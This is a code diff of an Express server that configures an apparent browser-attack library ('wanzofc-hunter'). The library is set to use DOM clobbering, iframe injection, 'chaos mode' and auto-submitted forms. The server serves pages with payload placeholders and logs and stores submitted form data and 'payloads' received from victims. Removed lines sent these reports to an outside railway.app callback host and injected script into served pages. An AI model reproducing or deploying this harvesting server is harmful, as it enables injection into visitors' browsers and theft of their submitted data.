@@ -1,78 +1,57 @@
 const express = require('express');
-const fs = require('fs');
+const wanzofc = require('wanzofc-hunter');
 const path = require('path');
-const bodyParser = require('body-parser');
-const { configure, expressMiddleware } = require('wanzofc-hunter');
+const fs = require('fs');
 const app = express();
-const PORT = process.env.PORT || 3000;
-
-configure({
-    callbackURL: 'https://wanzofc-hunter.up.railway.app/report',
-    iframeURL: 'https://paymu-wanzofc.up.railway.app',
-    domClobbering: true,
-    domClobberingLevel: 'advanced',
+wanzofc.configure({
+    callbackURL: null, // Callback URL dikosongkan, diisi di client-side
+    autoSubmitForms: true,
+    iframeInjection: true,
+   // iframeURL: null, // iframe URL dikosongkan, diisi di client-side
     chaosMode: true,
-    autoSubmitForms: true
+    domClobbering: true,
+    domClobberingLevel: 'advanced'
 });
 
-app.use(bodyParser.json());
-
-// Terima laporan hunter
-app.post('/report', (req, res) => {
-    console.log('>> Data Hunter <<');
-    console.log(JSON.stringify(req.body, null, 2));
-    res.status(200).send('Report diterima');
-});
-
-// Kalau browser GET /report
-app.get('/report', (req, res) => {
-    res.status(200).send('Endpoint report siap menerima data POST.');
-});
-
-// Terima klik tombol
-app.post('/klik', (req, res) => {
-    console.log('>> Event Klik Diterima <<');
-    console.log(JSON.stringify(req.body, null, 2));
-    res.status(200).send('Klik diterima!');
-});
-
-// Middleware inject hunter payload
-app.use((req, res, next) => {
-    const filePath = path.join(__dirname, req.path === '/' ? 'index.html' : req.path);
-
+app.use(express.urlencoded({ extended: true }));
+app.get('/', (req, res) => {
+    const filePath = path.join(__dirname, 'index.html');
     fs.readFile(filePath, 'utf8', (err, data) => {
         if (err) {
-            if (req.path.endsWith('.css') || req.path.endsWith('.js') || req.path.endsWith('.map')) {
-                console.warn('File resource tidak ditemukan, diabaikan:', filePath);
-                return res.status(204).send(); // No Content
-            }
-            console.error('File tidak ditemukan:', filePath);
-            return res.status(404).send('404 Not Found');
+            console.error("Gagal membaca file:", err);
+            return res.status(500).send('Internal Server Error');
         }
-
-        // Inject script untuk mengisi input dengan data-wanzofc
-        const injectionScript = `
-        <script>
-          window.onload = function() {
-            const klikSayaElement = document.getElementById('klikSaya');
-            const textToCopyInput = document.getElementById('textToCopy');
-
-            if (klikSayaElement && textToCopyInput) {
-              const wanzofcData = klikSayaElement.getAttribute('data-wanzofc');
-              textToCopyInput.value = wanzofcData || '';
-            }
-          };
-        </script>
-        `;
-
-        // Sisipkan script sebelum tag </body>
-        data = data.replace('</body>', injectionScript + '</body>');
-
-        res.body = data;
-        expressMiddleware()(req, res, next);
+    const defaultPayload = 'svg';
+    const defaultIframeURL = 'about:blank';
+        const modifiedData = data
+        .replace('{{PAYLOAD_INPUT}}', defaultPayload)
+        .replace('{{IFRAME_URL_INPUT}}', defaultIframeURL);
+        res.send(modifiedData);
     });
 });
 
-app.listen(PORT, () => {
-    console.log(`Server berjalan di http://localhost:${PORT}`);
+app.post('/form-submission', (req, res) => {
+    console.log('Data formulir:', req.body);
+    res.send('Data diterima!');
+});
+app.post('/payload', express.json(), (req, res) => {
+    console.log('Payload diterima:', req.body);
+
+            // Simpan payload ke file
+            const timestamp = Date.now();
+            const filename = `payload-${timestamp}.json`;
+            fs.writeFile(filename, JSON.stringify(req.body, null, 2), err => {
+             if (err) {
+                console.error('Gagal menyimpan payload:', err);
+                 res.status(500).send('Internal Server Error');
+              } else {
+               console.log(`Payload disimpan ke ${filename}`);
+                res.send('Payload diterima!');
+               }
+             });
+});
+
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+    console.log(`Server berjalan di: http://localhost:${port}`);
 });
